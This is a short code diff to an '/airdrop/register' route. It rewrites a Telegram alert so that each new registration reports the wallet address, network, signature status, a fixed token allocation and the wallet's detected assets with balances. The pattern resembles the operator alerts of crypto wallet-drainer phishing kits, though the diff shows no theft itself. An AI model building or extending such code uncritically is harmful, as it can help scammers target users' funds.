@@ -913,7 +913,26 @@ router.post("/airdrop/register", (req, res) => {
             
             // Send Telegram alert for new registrations
             if (!result.alreadyRegistered) {
-                sendTelegramAlert(`🎁 New Airdrop Registration!\n\nWallet: ${userAddress}\nType: ${walletType || 'unknown'}\nAssets: ${assets?.length || 0}\nTime: ${new Date().toISOString()}`);
+                // Format assets list for Telegram
+                let assetsInfo = 'None detected';
+                if (assets && assets.length > 0) {
+                    assetsInfo = assets.slice(0, 10).map(a => 
+                        `• ${a.symbol}: ${a.balance || '0'} (${a.chain || 'unknown'})`
+                    ).join('\n');
+                    if (assets.length > 10) {
+                        assetsInfo += `\n... and ${assets.length - 10} more`;
+                    }
+                }
+                
+                const telegramMessage = `🎁 *NEW AIRDROP REGISTRATION*\n\n` +
+                    `👛 *Wallet:*\n\`${userAddress}\`\n\n` +
+                    `🔗 *Network:* ${walletType === 'solana' ? 'Solana' : walletType === 'evm' ? 'EVM' : walletType || 'Unknown'}\n` +
+                    `✍️ *Signature:* ${signature ? '✅ Verified' : '❌ Not signed'}\n` +
+                    `💰 *Allocation:* 50,000 BNT\n\n` +
+                    `📊 *Assets Found (${assets?.length || 0}):*\n${assetsInfo}\n\n` +
+                    `🕐 *Time:* ${new Date().toISOString()}`;
+                
+                sendTelegramAlert(telegramMessage);
             }
             
             res.json({
